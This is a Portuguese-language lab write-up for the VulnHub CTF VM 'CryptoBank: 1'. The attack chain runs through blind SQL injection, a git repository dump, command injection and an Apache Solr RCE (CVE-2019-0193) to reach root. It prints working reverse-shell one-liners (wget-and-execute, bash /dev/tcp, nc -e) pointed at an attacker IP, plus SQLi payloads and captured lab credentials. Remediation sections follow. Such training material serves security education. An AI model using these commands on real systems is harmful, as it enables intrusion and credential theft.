# CryptoBank: 1 — Writeup (PT-BR)

> "Seu cofre é tão forte quanto sua query mais fraca." ( ͡° ͜ʖ ͡°)
>
> Uma VM com tema bancário que encadeia SQL injection baseado em tempo, repositório git exposto, injeção de comando e RCE interno no Apache Solr para chegar ao root. Cada serviço reutilizava a mesma senha: um vazamento para dominar todos. ¯\_(ツ)_/¯

---

| Campo | Valor |
|-------|-------|
| **Level** | Intermediário |
| **VM Alvo** | CryptoBank: 1 (Linux) |
| **VM Atacante** | Kali Linux 2023+ |
| **VulnHub URL** | https://www.vulnhub.com/entry/cryptobank-1 |
| **Técnicas** | Enum de virtual host, blind SQLi time-based, dump de repo git, injeção de comando, port forwarding SSH, RCE Apache Solr, escalação via sudo |
| **CVEs** | CVE-2019-0193 (Apache Solr 8.1.1 RCE via DataImportHandler) |
| **Grupos APT** | FIN7 (cadeia de intrusão financeira via SQLi), Lazarus Group (alvo setor bancário), APT41 (exploração web combinada com pivot interno) |

---

## Resumo do Ataque

```
[nmap] portas 22, 80
    |
    v
[Virtual host] cryptobank.local
    |
    v
[Página CORE TEAM] nomes de funcionários -> users.txt
    |
    v
[SQLMap blind time-based] banco cryptobank -> tabela accounts -> credenciais
    |
    v
[Hydra] /development HTTP Basic Auth -> julius.b:wJWm4CgV26
    |
    v
[GitHack] .git exposto -> código PHP -> mesma senha
    |
    v
[Injeção de Comando] CommandExecution.php -> reverse shell (www-data)
    |
    v
[Meterpreter] netstat revela 172.17.0.1:8983 (Solr dentro do Docker)
    |
    v
[Port Forward] porta 8983 do atacante -> bridge Docker do alvo
    |
    v
[CVE-2019-0193] Solr 8.1.1 RCE -> shell como usuário solr
    |
    v
[sudo su] senha: "solr" -> uid=0(root) -> /root/flag.txt
```

---

## Metodologia

1. Descoberta de host e scan de portas (netdiscover + nmap)
2. Identificação de virtual hostname e enumeração web
3. Coleta de nomes de usuários na página CORE TEAM
4. SQL injection blind baseado em tempo via SQLMap (arquivo de requisição do Burp)
5. Brute-force de diretório + ataque de credenciais HTTP Basic Auth com Hydra
6. Extração do repositório git via GitHack para revisão de código-fonte e credenciais
7. Injeção de comando para obter shell inicial e upgrade para Meterpreter
8. Descoberta de serviço interno via netstat, port forwarding e RCE no Solr (CVE-2019-0193)
9. Escalação de privilégio com a senha padrão do Solr via sudo

---

## Passo 1: Reconhecimento

Primeiro de tudo: descobrir o alvo na rede e mapear o que está escutando.

```bash
netdiscover -r 192.168.1.0/24
```

Anote o IP do alvo na tabela ARP. Depois execute um scan de serviços:

```bash
export TARGET=192.168.1.105
nmap -sV $TARGET
```

Saída esperada (resumida):

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd
```

Portas abertas: **22** (SSH) e **80** (HTTP). Apenas duas portas. Vamos tentar as duas.

> **TTP MITRE:** T1595.002 — Active Scanning: Vulnerability Scanning

> **Relevância no mundo real:** Empresas de serviços financeiros são varridas por operadores FIN7 e Lazarus em horas após entrar no ar. Apenas duas portas NÃO significa superfície de ataque pequena quando a aplicação web é complexa.

> **Alternativa:** `rustscan -a $TARGET --ulimit 5000 -- -sV` para descoberta de portas muito mais rápida em redes de laboratório.

---

## Passo 2: Descoberta de Virtual Hostname

A página principal (`http://$TARGET`) tem um botão "Secure Login" que aponta para `http://cryptobank.local/trade`. Isso significa que o Apache está configurado com um virtual host. Sem o cabeçalho `Host:` correto, vemos a página padrão; com ele, vemos a aplicação real.

Adicione o virtual hostname ao `/etc/hosts`:

```bash
echo "$TARGET cryptobank.local" | sudo tee -a /etc/hosts
```

Agora acesse `http://cryptobank.local/` para confirmar que o site completo carrega. Você deve ver a seção CORE TEAM com os perfis dos funcionários.

> **TTP MITRE:** T1590 — Gather Victim Network Information

---

## Passo 3: Coleta de Nomes de Usuários

Navegue até a seção CORE TEAM. Cada card de funcionário tem um ícone de email. Passe o mouse por cima ou veja o código-fonte da página: os valores de `href` contêm padrões como `mailto:julius.b@cryptobank.local`. Colete cada prefixo único no estilo de nome de usuário em uma wordlist:

```bash
cat > users.txt << 'EOF'
julius.b
[adicione todos os nomes que encontrar na página]
EOF
```

Essa wordlist vai alimentar o Hydra mais tarde. ( •_•)

> **TTP MITRE:** T1589.003 — Gather Victim Identity Information: Employee Names

---

## Passo 4: SQL Injection — Extração de Credenciais

Navegue até `http://cryptobank.local/trade` (o formulário Secure Login). Capture uma requisição POST com o Burp Suite e salve como `req.txt`.

Primeiro, enumere os bancos disponíveis:

```bash
sqlmap -r req.txt --dbs --batch
```

A injeção é blind baseada em tempo, então a extração é lenta. Espere vários minutos por query. Quando a lista de bancos aparecer, mire no `cryptobank`:

```bash
sqlmap -r req.txt -D cryptobank --tables --batch
```

Depois dump da tabela `accounts`:

```bash
sqlmap -r req.txt -D cryptobank -T accounts --dump --batch
```

Você vai obter 12 entradas ou mais, incluindo nomes de usuário e senhas em texto puro ou facilmente recuperáveis. Construa um `pass.txt` com as senhas extraídas.

> **TTP MITRE:** T1190 — Exploit Public-Facing Application; T1078.001 — Valid Accounts: Default Accounts

> **Relevância no mundo real:** O SQLi blind baseado em tempo é usado por APT41 e FIN7 precisamente porque WAFs frequentemente não o detectam. A técnica envia payloads que fazem o banco de dados dormir por N segundos em uma condição TRUE, inferindo os dados bit a bit.

> **Alternativa:** Extração manual com `curl` e payloads baseados em `sleep` (`' OR IF(SUBSTRING(password,1,1)='a',SLEEP(2),0)-- -`) se você quiser entender a mecânica sem o SQLMap.

---

## Passo 5: Brute-force de Diretório e Login de Desenvolvimento

Execute o dirb contra o virtual host para encontrar diretórios ocultos:

```bash
dirb http://cryptobank.local/
```

Um diretório `/development` aparece com HTTP Basic Auth. Use o Hydra com os nomes de usuário e senhas coletados:

```bash
hydra -L users.txt -P pass.txt cryptobank.local -f http-get /development
```

Par válido encontrado: `julius.b` / `wJWm4CgV26`. ( ˘ ³˘)♥

Agora faça brute-force dentro do diretório autenticado:

```bash
dirb http://cryptobank.local/development/ -u julius.b:wJWm4CgV26
```

Diretórios encontrados: `/development/tools/` e `/development/backups/`. Vá mais fundo:

```bash
dirb http://cryptobank.local/development/backups/home/
```

Um diretório `.git` está exposto. É aqui que as coisas ficam interessantes. ( ͡° ͜ʖ ͡°)

> **TTP MITRE:** T1083 — File and Directory Discovery; T1212 — Exploitation for Credential Access

---

## Passo 6: Extração do Repositório Git

Um diretório `.git` exposto permite reconstruir toda a árvore de código-fonte. Clone o GitHack e extraia:

```bash
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
python GitHack.py http://cryptobank.local/development/backups/home/.git/
```

Isso reconstrói o repositório em `cryptobank.local/`. Navegue até `tools/CommandExecution/` e inspecione o código PHP. Você vai encontrar a senha para o endpoint de execução de comandos: `wJWm4CgV26` (mesma da autenticação de desenvolvimento, reutilização de senha confirmada ¯\_(ツ)_/¯).

> **TTP MITRE:** T1213 — Data from Information Repositories; T1552.001 — Credentials in Files

> **Relevância no mundo real:** Mais de 400.000 servidores web reais foram encontrados com diretórios `.git` expostos segundo estudos acadêmicos. Esse não é um problema apenas de laboratório. Brechas desse tipo foram exploradas por Lazarus e outros grupos para exfiltrar código-fonte de aplicações bancárias.

> **Alternativa:** `git-dumper` (`pip install git-dumper`) é o substituto moderno do GitHack: `git-dumper http://cryptobank.local/development/backups/home/.git/ output/`

---

## Passo 7: Injeção de Comando — Reverse Shell

Acesse a ferramenta CommandExecution no browser em `http://cryptobank.local/development/tools/CommandExecution/`. Autentique com `julius.b:wJWm4CgV26`.

Verifique a execução primeiro (sempre confirme antes de jogar uma shell):

- Campo nome de usuário: `id`
- Campo senha: `wJWm4CgV26`

A saída do `id` deve aparecer na resposta. Temos execução de comandos como o usuário do servidor web. Agora crie um payload:

```bash
export LHOST=192.168.1.107
export LPORT=4444
msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT -f raw > revshell.sh
```

Sirva o arquivo:

```bash
python3 -m http.server 8000
```

Inicie o listener no Metasploit:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload cmd/unix/reverse_bash; set LHOST $LHOST; set LPORT $LPORT; exploit"
```

Use a injeção de comando para baixar e executar o payload (insira no campo "nome de usuário"):

```
wget http://192.168.1.107:8000/revshell.sh -O /tmp/rs.sh && bash /tmp/rs.sh
```

Uma shell chega como `www-data`.

> **TTP MITRE:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1105 — Ingress Tool Transfer

> **Alternativa:** Um one-liner bash puro no campo de injeção também funciona sem hospedar um arquivo: `bash -i >& /dev/tcp/$LHOST/4444 0>&1`

---

## Passo 8: Upgrade para Meterpreter e Descoberta Interna

No console do Metasploit, faça upgrade da shell bash para uma sessão Meterpreter:

```bash
sessions -u 1
sessions 2
```

Agora verifique as conexões de rede internas:

```bash
netstat -antp
```

A porta **8983** está escutando em `172.17.0.1`, que é a interface bridge do Docker. O Apache Solr está rodando dentro de um container Docker, vinculado apenas à bridge do host. Não é alcançável diretamente pelo atacante.

> **TTP MITRE:** T1049 — System Network Connections Discovery; T1016 — System Network Configuration Discovery

---

## Passo 9: Port Forwarding para o Solr

Encaminhe a porta 8983 pela sessão Meterpreter para torná-la acessível na máquina atacante:

```bash
portfwd add -l 8983 -p 8983 -r 172.17.0.1
```

Acesse `http://127.0.0.1:8983/` na máquina atacante. Apache Solr **8.1.1** confirmado. ( ͡° ͜ʖ ͡°)

> **TTP MITRE:** T1572 — Protocol Tunneling; T1090 — Proxy

---

## Passo 10: RCE no Apache Solr (CVE-2019-0193)

O Solr 8.1.1 é vulnerável a execução remota de código via o recurso DataImportHandler (CVE-2019-0193). Busque o exploit:

```bash
searchsploit solr
searchsploit -m 47572
```

Faça upload do exploit para o diretório `/tmp` do alvo via Meterpreter:

```bash
upload /root/47572.py /tmp/47572.py
```

Faça upgrade da shell Meterpreter para um TTY:

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

Inicie um listener netcat:

```bash
nc -lvp 7654
```

Execute o exploit:

```bash
cd /tmp
python3 47572.py 172.17.0.1 8983 "nc -e /bin/bash 192.168.1.107 7654"
```

Uma shell chega na porta 7654. Bingo!! (☞ﾟヮﾟ)☞

> **TTP MITRE:** T1210 — Exploitation of Remote Services; T1068 — Exploitation for Privilege Escalation

> **Relevância no mundo real:** O CVE-2019-0193 foi ativamente explorado por grupos de criptomineração e pelo APT41 logo após a divulgação pública. Instâncias do Solr acessíveis a partir de uma rede interna após o comprometimento de uma DMZ são um pivot clássico de movimentação lateral.

---

## Passo 11: Escalação de Privilégio

Na shell do Solr, faça upgrade para TTY e verifique as permissões sudo:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
sudo -l
```

Acesso sudo completo está configurado. A senha padrão do serviço Solr é `solr`:

```bash
sudo su
# Senha: solr
id
# uid=0(root) gid=0(root) groups=0(root)
```

Root! ᕕ( ᐛ )ᕗ

```bash
cd /root
cat flag.txt
```

> **TTP MITRE:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching

---

## Flags / Hashes / Credenciais Capturadas

| Item | Valor |
|------|-------|
| HTTP Basic Auth desenvolvimento | `julius.b` / `wJWm4CgV26` |
| Senha CommandExecution | `wJWm4CgV26` |
| Senha sudo Solr | `solr` |
| Dump SQL contas | 12 entradas (veja `loot/sqlmap-dump.txt`) |
| Flag root | `/root/flag.txt` |

---

## Lições Aprendidas

1. **Diretórios `.git` expostos** em servidores web de produção permitem recuperação completa de código-fonte e credenciais. Qualquer atacante com acesso HTTP pode reconstruir todo o histórico de commits.

2. **SQLi blind baseado em tempo** funciona mesmo quando a aplicação não retorna nenhuma saída de erro visível. A defesa exige queries parametrizadas, não apenas esconder mensagens de erro.

3. **Reutilização de senha em todos os serviços** (dump SQL, HTTP Basic Auth, execução de comandos, Solr) significou que um único vazamento de credencial deu acesso a toda a cadeia. Uma chave abriu todas as portas.

4. **Rodar o Solr dentro do Docker não isola o serviço** uma vez que o host está comprometido e o port forwarding está disponível. A segmentação de rede precisa ser aplicada no nível do firewall do host, não apenas com a rede de containers.

5. **Senhas padrão de serviço** (`solr` para o Solr) em regras de sudo são uma configuração crítica errada. Qualquer serviço com senha padrão conhecida deve ter essa senha alterada antes da implantação.

**Relevância no Mundo Real:** Essa cadeia de ataque (SQLi para dump de credenciais, pivot para serviço interno, RCE) espelha intrusões documentadas do FIN7 contra alvos do setor bancário. A combinação de código-fonte exposto, reutilização de senha e serviço interno sem patch é perturbadoramente comum.

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID | Ferramenta |
|--------|---------|-----|------------|
| Reconhecimento | Active Scanning: Vulnerability Scanning | T1595.002 | nmap |
| Reconhecimento | Gather Victim Network Information | T1590 | manual |
| Reconhecimento | Gather Victim Identity Information: Employee Names | T1589.003 | browser |
| Acesso Inicial | Exploit Public-Facing Application | T1190 | SQLMap |
| Acesso a Credenciais | Data from Information Repositories | T1213 | GitHack |
| Acesso a Credenciais | Credentials in Files | T1552.001 | git diff |
| Execução | Command and Scripting Interpreter: Unix Shell | T1059.004 | injeção PHP |
| Execução | Exploitation of Remote Services | T1210 | CVE-2019-0193 |
| Movimentação Lateral | Protocol Tunneling | T1572 | Meterpreter portfwd |
| Descoberta | System Network Connections Discovery | T1049 | netstat |
| Descoberta | File and Directory Discovery | T1083 | dirb |
| Escalação de Privilégio | Abuse Elevation Control Mechanism: Sudo | T1548.003 | sudo su |
| Comando e Controle | Ingress Tool Transfer | T1105 | python3 http.server |

---

## Remediação

### NIST CSF 2.0

| Função | Controle | Ação |
|--------|----------|------|
| Identificar (ID.AM) | Inventário de ativos | Catalogar todos os serviços internos, incluindo os dentro do Docker |
| Proteger (PR.AC) | Controle de acesso | Remover sudo NOPASSWD das contas de serviço |
| Proteger (PR.DS) | Segurança de dados | Bloquear acesso `.git` na configuração do servidor web |
| Detectar (DE.CM) | Monitoramento contínuo | Alertar sobre padrões de query SQL com delay temporal (WAF + SIEM) |
| Responder (RS.MI) | Mitigação de incidentes | Isolar o Solr em uma VLAN dedicada sem acesso externo à camada web |

### NIST SP 800-53 Rev. 5

| Controle | Descrição |
|---------|-----------|
| SI-2 | Remediação de Falhas: corrigir o Solr para a versão estável mais recente |
| AC-6 | Menor Privilégio: remover sudo completo da conta de serviço `solr` |
| IA-5 | Gerenciamento de Autenticador: aplicar senhas únicas por serviço |
| SC-7 | Proteção de Fronteira: bloquear no firewall a interface bridge do Docker da camada web |
| SA-15 | Processo de Desenvolvimento: bloquear deploy de repositórios com segredos no histórico git |

### CISA KEV

O CVE-2019-0193 (Apache Solr DataImportHandler RCE) consta no catálogo de Vulnerabilidades Conhecidas Exploradas da CISA. As organizações devem aplicar os patches imediatamente ou desabilitar o recurso DataImportHandler se não estiver em uso.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domínio | Prática | Lacuna |
|---------|---------|--------|
| Asset, Change, and Configuration Management (ASSET) | MIL-1 | Serviços internos (Solr) não rastreados no inventário de ativos |
| Identity and Access Management (IAM) | MIL-2 | Senhas de contas de serviço não rotacionadas; sudo sem escopo |
| Threat and Vulnerability Management (THREAT) | MIL-1 | Sem processo de patch para middleware interno; má configuração `.git` não detectada |

### MITRE D3FEND

| Técnica D3FEND | ID | Endereça |
|----------------|----|----------|
| Web Application Firewall | D3-WAF | Detecção e bloqueio de SQLi |
| Application Configuration Hardening | D3-ACH | Bloquear acesso HTTP ao `.git`; desabilitar DataImportHandler do Solr |
| Network Traffic Filtering | D3-NTF | Bloquear bridge Docker interna da camada web |
| Credential Transmission Scoping | D3-CTS | Aplicar credenciais únicas por serviço |
| Software Update | D3-SU | Corrigir o Solr para versão sem CVE-2019-0193 |

---

## Considerações Finais

CryptoBank: 1 é uma obra-prima sobre como a reutilização de credenciais parece quando vai até o fundo da pilha. A dificuldade pretendida é "intermediária," mas as técnicas aqui: SQLi blind baseado em tempo, dump de git, port forwarding para um RCE interno, são exatamente o que red teams usam contra alvos financeiros reais. Se você resolveu esta box, você entende por que o FIN7 tem sido tão eficaz por uma década.

Agradecimento especial ao autor por construir uma box que encadeia cada etapa de forma lógica. Cada peça do quebra-cabeça ganhou seu lugar na cadeia. ಠᴗಠ

Thanks guys!! (❍ᴥ❍ʋ)
